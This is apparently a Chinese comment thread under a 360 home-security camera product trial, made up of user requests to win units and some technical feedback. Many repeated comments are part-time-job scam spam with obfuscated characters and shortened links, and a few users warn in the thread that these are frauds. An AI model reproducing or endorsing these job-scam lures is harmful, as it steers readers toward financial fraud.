一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
360介绍加图片不是很清楚。 
应该会很好用，不如尝试一下
如果我中签了，我打算把它放在家里，这样的话，在上班的时候也可以知晓家里的情况，随时随地地关注家里，就不怕家里来盗贼了！！~~（本人家里经常失窃~）希望360家庭卫士支持与360安全卫士类产品同步wifi连接,同时支持电脑及手机版,用以同时充当电脑及手机音频输入/输出设备，这样安全感可以提升好多呢！！~~希望我中签！快显灵哦！！我很需要！！~~ 
这么好的东西我一定要实验一下看看它有这么好不 希望给我这个机会谢谢
你当大白菜呐！！！！
真心希望能够赢得，这产品真的是太棒了！
可以买到吗？想买？
经常失窃.........
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭5o~ 15o， 我详细作讲解～  
～不限制工作时间， 做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭5o~ 15o， 我详细作讲解～  
早有它，俺的车钥匙就不至于丢了!值得拥有
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o，  我详细作讲解～  
～不限制工作时间，做的越多挣的越多～ ～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
跪求你家地址！我也去，你家是金库吧！小偷会这么频繁！
怎么149元了？？？之前抢的那批不是卖99元么
用来看护小孩 很不错的
名额太少了啊
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
～不限制工作时间 ，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
在外形上，颜色上和可移动安装上在下点功夫，我想一定可以买的很好
肯定很好用 
不怕有小三了。
对于360这款家庭卫士，个人一些建议： 1、没有红外灯，这是一带缺陷； 2、用的是120°镜头，120°镜头也有缺陷，会让画面图像变形，建议用2.8或者3.6mm足够了。 3、里面标明的参数是15帧，这是标错吗？15帧率画面会很延时；常见的在PAL模式下 都是25帧率/s; 4、远程访问是p2p模式吗？ 5、作为家庭卫士，少了存储模式，想问下，要一天到晚开着电脑录像吗？ 
应该算是鸡肋  现在新买电脑的话基本好多都是触屏 还有如果买个不是触屏的话再买这个 价格也差不多是个触屏的价了 
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~ 15o， 我详细作讲解～
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭5o~ 15o， 我详细作讲解～
360家庭卫士已经升级了，支持遥控巡航，和遥控汽车差不多，支持定时巡航功能。摄像头可360度反转无死角监控。内置3000毫安备用电源，断电一样可以监控，内置16G内存无网络状态下可以暂时储存在本地。结合360云盘无限空间免费云储存。【1年自动清除一次，清除前会提醒，由用户选择删除某时间段监控视频】内置迷你路由直接插网线秒变路由。360将发布更多外壳，让视频监控更具人性，有更多建议请@360家庭卫士
第一，你们所说的手机访问，跟手机的宽带有影响的，且画质也很差； 第二、通常大家不会一天到晚开着手机查看家里的情况，这样浪费多少流量； 第三、此摄像机是否支持移动侦测报警，然后发生到手机邮箱，或者此款设备联动到报警设备（是否考虑）； 第四，wifi穿墙效果如果，这款内置wifi天线的话，不知道无线传输距离多远， 远程访问是不是直接输入序列号即可访问，不需要设置DDNS等复杂的网络设置；简称P2P模式
是否能储存录像呢？最好是直接连接云U盘，可以将所有的录像都保存，出事才能发现 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～ 
这个你是不懂的，电脑不会24小时开机录像的，这是常识；一般摄像机都带有TF卡或者SD卡存储；
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
这个摄像机，我办公桌上 十几个，你要的我 我也有啊 都是200万像素 比这个高级多了 还可以移动侦测报警录像发送到手机邮箱里呢 
做份轻松的傔耳只 搞点零花钱吧。一天2-3小时整80-150元，日结。无時间地点要求，随时有空随时可做。根据自己实际情况安排时间不影响正职。有意者复制到 浏览器打开 【 http://t.cn/8sseZN4 】
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
99要，149的不要！！
已经提交申请，希望自己得中，一直支持360.大家快来试试看啊
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
希望可以随意旋转，360°全视角
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
对于360这款家庭卫士，个人一些建议： 1、没有红外灯，这是一带缺陷； 2、用的是120°镜头，120°镜头也有缺陷，会让画面图像变形，建议用2.8或者3.6mm足够了。 3、里面标明的参数是15帧，这是标错吗？15帧率画面会很延时；常见的在PAL模式下 都是25帧率/s; 4、远程访问是p2p模式吗？ 5、作为家庭卫士，少了存储模式，想问下，要一天到晚开着电脑录像吗？
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～   
这个好，360我永远挺你
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
真心希望能够赢得，这产品真的是太棒了！好东西啊，值得拥有
刚刚提交了，一直用360的备机软件，支持360.希望能得签..嘿嘿
真心希望能够赢得，这产品真的是太棒了！好东西啊，值得拥有 
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～
～不限制工作时间，做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～
感觉对普通人没什么大的用
感觉对普通人没什么大的用
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
I&#039;d lowe 360牌防丢卫士！！！！！！！！！
产品太棒了，值得拥有！
 如果我中签了，我打算把它放在家里，这样的话，在上班的时候也可以知晓家里的情况，随时随地地关注家里，就不怕家里来盗贼了！！~~（本人家里经常失窃~）希望360家庭卫士支持与360安全卫士类产品同步wifi连接,同时支持电脑及手机版,用以同时充当电脑及手机音频输入/输出设备，这样安全感可以提升好多呢！！~~希望我中签！快显灵哦！！我很需要！！~~  
早知道有这个东东，我就不装摄像头了 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
支持奇酷！
541526
～不限制工作时间，做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～ 
～不限制工作时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～ 
很潮，很科技，很未来，我真希望拥有它！
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～ 
妞。我知道是你。我现在彻底明白你说的回不去了的意思。你是不是已经定下与我的爱情生死账，把自己一生和爱情都赌注在我会坚持爱你的信念，如果我没猜错，那我就宣布我的誓言。我陈建石向世人宣布。我此生非余婧不娶，忠于你一生，如果要签合同，那么马上签吧，期限就是三生三世，让世人为我们作证，让360成长为我们做正。开始我们的幸福人生之旅吧。
很喜欢！ 很期待~
看起来好赞
这个不能再赞，我好早就想要个类似的玩意儿了
真心希望能够赢得，这产品真的是太棒了！
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～   
很想试用一个，最近我老是忘事儿，东西总是不知道放到哪儿了。  
有SD卡槽
～不限制工作时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我 详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
我也想给宝贝买
这种无线传输的摄像头市场上早就有出来了，能实时监控，抓拍，录像，报警，语音，可以用手机，平板，电脑控制摄像头，价格也不贵，不过对WIFI网络速度有关系，。。就是不知道360的怎么样，，申请一个看看
期待中啊。。。。
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
真是善解人意啊 ，我刚刚想买一个，不知道在哪里买，网上买的好贵啊。电子城又好会坑人啊。
我相信一定很好用
第一次尝试，以前了解过类似的产品，与点贵哦！想测试下360的强大，威武！
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
对我这种丢三拉四的人有用啊，只是运气不知道怎么样，给我来一个试用一下呗。
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
着个太好了，我喜欢呀
我们这有便宜的
住的地方治安不怎么好，经常有偷窃发生，想用这款神器保护家里安全！
是的 已经出几年了 可以远程控制
想体验下远程操作的朋友可以加我
期待这个很不错的产品
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开  ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
这就是带电池的溜冰鞋嘛
可以花钱装一个 
请你看酷币的数量，，，
～不限制工作 时间， 做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
很不错啊，希望能抽中，多多支持360
这应该是高科技了，父母在老家我很无奈，好像买一个简单而又一幕了然的血压仪带回去。
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
真的吗？可不可以放在老家使用，这样我就可以天天和我家的宝贝说说话，看到她的身影了，
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
多么期待这个宝贝，我很想要一个。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
好想要一辆啊，希望早点出世
好想要一辆啊，希望早点出世
很新奇，功能一定很全，上市的话，一定会很红，会大卖吧！我有这种预感。希望我能抽中一个。我可是360的忠实粉丝呢！卖个萌，么么哒!求抽中~
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
给你赞一个，百善孝为先嘛。
买了新电视屏，新主机，爸妈店铺就差摄像头了。求抽中~~~
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
挺不错的，希望能抽中
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
家里有一个偏瘫的父亲现在自己一个人居住 不知道从什么时候开始产生幻觉 总觉得有人偷他东西 我怕出什么事 希望能抽中我 万分感谢了
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～   
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解 ～   
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～   
想要，非常喜欢，可爱又实用
帅气哦。。。。
不错，360的产品越来越丰富了，加油~~~
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
谁能送我个预约码，来晚了
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
期待ing
好精致哦，好想要哦，什么时候可以上市 ？？？？
还要开关干什么呀 做成遥控器 接受器可组合安装 这样一个遥控器在手可以控制家里所有开关 最好可以用手机也能控制
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
两个都是360。奇酷网怎么怎么奇怪？天猫都发售了我前天买了个现在还可以买，这里还要预约？天猫也是360官方网店怎么两个都是360的差别怎么大？http://detail.tmall.com/item.htm?spm=a220o.1000855.w5001-6633919014.12.ll4Lgo&amp;id=38887866685&amp;scene=taobao_shop
家里有两台电脑，希望先试用，效果好再买。
中奖了用了再评论！谢谢。
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o，  我详细作讲解～ 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
这么贵不能便宜点么
你的1问题我也试过，这个不是360u盘的问题，我的wifi家庭网卡也是这样子，插的时候不能开机卡在欢迎的蓝屏，要插开然后在开机到了电脑桌面在插。不知道你是是不是到了蓝屏的欢迎那里，如果是的话我的wifi那里有说明是XP系统落后了开始不正常usb驱动了。
对于我这种出门前翻箱倒柜找钥匙和钱包的表示非常想要
大家注意，那些招兼职的每天日结的都是骗子，不要上当，千万不要抱着试一试侥幸心理，千万不要交钱给他们
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
注意：找兼职，日结等 均属骗人行为，请大家不要上当受骗，一般情况是交了钱就后悔了。
选我选我选我选我选我选我︿(￣︶￣)︽(￣︶￣)︿飞.飞.飞.
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
不会这么简单
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
招兼职的都是忽悠人的 ，交了钱就后悔了，大家不要相信
别信兼职的
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
千万别信 搛耳只 的，都是偏子，交了钱就知道错了，后悔没用
收到后 使用了再来
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很期待试用结果，
可以当wifi吗 
装在家里一定很酷
http://detail.tmall.com/item.htm?spm=a220o.1000855.w5001-6633919014.12.ll4Lgo&amp;id=38887866685&amp;scene=taobao_shop什么时候都有买我就没抢过。
http://detail.tmall.com/item.htm?spm=a220o.1000855.w5001-6633919014.12.ll4Lgo&amp;id=38887866685&amp;scene=taobao_shop什么时候都有买我就没抢过。
很多人就有了，你还在等吗http://user.qzone.qq.com/396530299/blog/1405269068
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很期待能够入选
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o，  我详细作讲解～  
我一直是360的忠实粉丝  希望越做越好 出更多的产品
希望这次能中奖
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解
重在参与，希望入选，值得信赖的360
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
晒比骗人的 你根本写不了手机号都
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解
试试看看！
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
建议把状态指示灯去掉，如果家里进贼了，状态指示灯很可能会暴露监控的位置，这样贼就可以把它拿走，毁掉证据
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
希望商家能选中我，因为我太喜欢了。
期待着我的试用啊~
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间，  做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
真的希望360有更多的产品，来维护网络安全和家庭社会的安全。
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解
小物件改变大生活
手机电脑里一直都是用的360产品，给个入选吧
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
当年腾讯耍无赖，支持360了，给个机会吧！
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解 
参加过N次了，我不知道有没有机会得到试用，但是对360还是点赞一下！
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
酷，穿起来不会摔倒吧，
为什么不打个洞
可以挂钥匙上
触屏电脑....不太需要 
3个0？呵呵让挤了？
